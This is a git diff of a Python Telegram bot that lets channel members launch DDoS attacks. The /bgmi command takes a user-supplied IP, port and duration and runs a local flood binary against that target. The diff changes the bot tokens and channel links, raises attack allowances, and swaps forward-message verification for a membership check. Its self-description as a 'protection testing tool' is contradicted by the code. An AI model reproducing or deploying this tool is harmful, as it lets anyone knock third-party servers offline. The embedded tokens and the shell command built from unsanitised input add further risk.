@@ -17,15 +17,15 @@ from requests.exceptions import ReadTimeout
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
 # Telegram bot token and channel IDs
-TOKEN = '7788865701:AAFQFi_UzrLETGdJIDmPMBaZuQcOBeLfGdo'  # Replace with your actual bot token
+TOKEN = '7828525928:AAGZIUO4QnLsD_ITKGSkfN5NlGP3UZvU1OM'  # Replace with your actual bot token
 CHANNEL_ID = '-1002298552334'  # Replace with your specific channel or group ID for attacks
 FEEDBACK_CHANNEL_ID = '-1002124760113'  # Replace with your specific channel ID for feedback
 message_queue = []
 
 
 # Official channel details
-OFFICIAL_CHANNEL = "https://t.me/+_nbkEdBwzjk0Y2Q1"  # Replace with your channel username or ID
-CHANNEL_LINK = "https://t.me/+_nbkEdBwzjk0Y2Q1"  # Replace with your channel link
+OFFICIAL_CHANNEL = "@titanfreeop"  # Replace with your channel username or ID
+CHANNEL_LINK = "https://t.me/titanfreeop"  # Replace with your channel link
 
 # Initialize the bot
 bot = telebot.TeleBot(TOKEN)
@@ -44,33 +44,24 @@ user_cooldowns = {}
 user_photos = {}  
 user_bans = {}  
 pending_feedback = set()
-verified_users = {}  # Dictionary to store verified users
 reset_time = datetime.now().astimezone(timezone(timedelta(hours=5, minutes=30))).replace(hour=0, minute=0, second=0, microsecond=0)
-# Verification expiry duration (e.g., 24 hours)
-VERIFICATION_EXPIRY = timedelta(hours=1)
 
 # Configuration
-COOLDOWN_DURATION = 500  # 1 minute cooldown
+COOLDOWN_DURATION = 60  # 1 minute cooldown
 BAN_DURATION = timedelta(hours=1)  # 1 hour ban for invalid feedback
 DAILY_ATTACK_LIMIT = 5000
 EXEMPTED_USERS = [7163028849, 7184121244]
 # Configuration
-MAX_ATTACK_DURATION = 180  # Maximum attack duration in seconds (e.g., 300 seconds = 5 minutes)
+MAX_ATTACK_DURATION = 60  # Maximum attack duration in seconds (e.g., 300 seconds = 5 minutes)
 
 def is_member(user_id):
-    """Since the channel is private, we cannot check membership directly."""
-    return True  # Assume the user is a member, or implement a manual verification process
-
-def is_verified(user_id):
-    """Check if the user is verified and the verification is still valid."""
-    if user_id in verified_users:
-        last_verified = verified_users[user_id]
-        if datetime.now() - last_verified < VERIFICATION_EXPIRY:
-            return True
-        else:
-            # Verification expired
-            del verified_users[user_id]
-    return False
+    """Check if the user is a member of the official channel."""
+    try:
+        chat_member = bot.get_chat_member(OFFICIAL_CHANNEL, user_id)
+        return chat_member.status in ["member", "administrator", "creator"]
+    except Exception as e:
+        logging.error(f"Failed to check membership: {e}")
+        return False
 
 
 def sanitize_filename(filename):
@@ -165,21 +156,25 @@ def handle_photo(message):
             os.remove(image_path)
 
 
-
 @bot.message_handler(commands=['bgmi'])
 def bgmi_command(message):
     global attack_in_progress
     reset_daily_counts()
     user_id = message.from_user.id
 
-    # Check if the user is verified and the verification is still valid
-    if not is_verified(user_id):
+    # Check if user has joined the official channel
+    if not is_member(user_id):
+        # Create a "Join Channel" button
+        markup = InlineKeyboardMarkup()
+        markup.add(InlineKeyboardButton("🌟 Join Official Channel 🌟", url=CHANNEL_LINK))
+        markup.add(InlineKeyboardButton("✅ I've Joined", callback_data="check_membership"))
+
         bot.reply_to(
             message,
             "🚨 *Access Denied* 🚨\n\n"
-            "👀 To use this bot, you must join our private channel and verify yourself. ⚠️\n"
-            "🚀 Please forward a message from the private channel to verify. 🚀"
-            "🔗 Link :- https://t.me/+_nbkEdBwzjk0Y2Q1 ☠️",
+            "To use this bot, you must join our official channel.\n"
+            "Click the button below to join and then press *'I've Joined'* to verify.",
+            reply_markup=markup,
             parse_mode="Markdown"
         )
         return
@@ -250,7 +245,7 @@ def bgmi_command(message):
 
         # Create a "Support" button
         support_button = InlineKeyboardMarkup()
-        support_button.add(InlineKeyboardButton("🙏 Support 🙏", url="https://t.me/titanddos24op"))
+        support_button.add(InlineKeyboardButton("🙏 Support 🙏", url="https://t.me/titanfreeop"))
 
         # Send attack confirmation with attacker's name and support button
         bot.reply_to(
@@ -271,27 +266,21 @@ def bgmi_command(message):
     finally:
         attack_in_progress = False
 
-@bot.message_handler(func=lambda message: message.forward_from_chat is not None)
-def handle_forwarded_message(message):
-    user_id = message.from_user.id
-    forwarded_chat_id = message.forward_from_chat.id
-
-    # Replace with your private channel ID
-    PRIVATE_CHANNEL_ID = -1002272079452  # Replace with your private channel ID
-
-    if forwarded_chat_id == PRIVATE_CHANNEL_ID:
-        # User has forwarded a message from the private channel
-        verified_users[user_id] = datetime.now()  # Update verification timestamp
-        bot.send_message(message.chat.id, "✅ Thank you for verifying! You can now use /bgmi.")
+@bot.callback_query_handler(func=lambda call: call.data == "check_membership")
+def check_membership(call):
+    """Handle the 'I've Joined' button click."""
+    user_id = call.from_user.id
+    if is_member(user_id):
+        bot.answer_callback_query(call.id, "✅ Thank you for joining! You can now use /bgmi.")
     else:
-        bot.send_message(message.chat.id, "❌ Please forward a message from the correct private channel.")
+        bot.answer_callback_query(call.id, "❌ You haven't joined the channel yet. Please join and try again.")
 
 async def execute_attack(ip, port, duration, username):
     """Run attack command asynchronously with predefined packet size and thread count."""
     try:
         # Start the attack process with predefined values
         proc = await asyncio.create_subprocess_shell(
-            f"./Spike {ip} {port} {duration} 12 750",
+            f"./LEGEND {ip} {port} {duration}",
             stderr=asyncio.subprocess.PIPE
         )
 
@@ -331,16 +320,16 @@ def send_welcome(message):
     *_A Powerful DDoS Protection Testing Tool_*
     
     📌 *Quick Start Guide*
-    1️⃣ Join our private channel: https://t.me/+_nbkEdBwzjk0Y2Q1
-    2️⃣ Forward a message from the private channel to this bot to verify.
-    3️⃣ Use /bgmi command to start attack
+    1️⃣ Use /bgmi command to start attack
+    2️⃣ Follow format: /bgmi IP PORT TIME
+    3️⃣ Provide feedback after each attack
     
     ⚠️ *Rules*
     - Max attack time: 1 minutes ⏳
     - Daily limit: 15 attacks 📊
     - Banned for fake feedback 🚫
     
-    🔗 Support: https://t.me/+_nbkEdBwzjk0Y2Q1
+    🔗 Support: @titanfreeop
     🔰 Owner : @Titanop24
     """
     
@@ -348,7 +337,7 @@ def send_welcome(message):
     markup = telebot.types.InlineKeyboardMarkup()
     markup.add(
         telebot.types.InlineKeyboardButton("⚡ Start Attack", callback_data='start_bgmi'),
-        telebot.types.InlineKeyboardButton("📚 Tutorial", url='https://t.me/+_nbkEdBwzjk0Y2Q1')
+        telebot.types.InlineKeyboardButton("📚 Tutorial", url='https://t.me/titanfreeop')
     )
     
     bot.send_message(
@@ -380,7 +369,7 @@ def send_help(message):
     - Attack limits: Prevents abuse 🛑
     
     📌 *Need Help?*
-    Contact support: https://t.me/+_nbkEdBwzjk0Y2Q1
+    Contact support: @titanfreeop
     Report issues: @Titanop24
     """
     
@@ -388,7 +377,7 @@ def send_help(message):
     markup = telebot.types.InlineKeyboardMarkup()
     markup.add(
         telebot.types.InlineKeyboardButton("🆘 Immediate Support", url='t.me/Titanop24'),
-        telebot.types.InlineKeyboardButton("📘 Documentation", url='https://t.me/titanddos24op')
+        telebot.types.InlineKeyboardButton("📘 Documentation", url='https://t.me/titanfreeop')
     )
     
     bot.send_message(
